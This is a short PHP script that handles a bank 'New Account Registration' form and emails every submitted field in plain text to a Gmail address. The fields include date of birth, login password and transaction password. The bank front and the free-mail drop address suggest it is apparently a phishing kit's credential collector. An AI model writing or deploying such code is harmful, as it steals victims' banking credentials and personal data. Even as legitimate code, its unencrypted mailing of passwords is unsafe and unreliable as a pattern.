<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $to = "skyboardfinancebnk@gmail.com";
    $subject = "New Account Registration";

    $message = "
    Customer's First Name: " . $_POST['firstName'] . "\n
    Customer's Last Name: " . $_POST['lastName'] . "\n
    Customer's Phone: " . $_POST['phone'] . "\n
    Email: " . $_POST['email'] . "\n
    Country: " . $_POST['country'] . "\n
    State: " . $_POST['state'] . "\n
    Date of Birth: " . $_POST['dob'] . "\n
    Gender: " . $_POST['gender'] . "\n
    City: " . $_POST['city'] . "\n
    Login ID: " . $_POST['loginId'] . "\n
    Login Password: " . $_POST['loginPassword'] . "\n
    Transaction Password: " . $_POST['transactionPassword'] . "\n
    Bank Branch: " . $_POST['bankBranch'] . "\n
    Account Type: " . $_POST['accountType'] . "\n
    ";

    $headers = "From: noreply@skyboardfinancebank.online";

    if (mail($to, $subject, $message, $headers)) {
        echo "success";
    } else {
        echo "error";
    }
}
?>
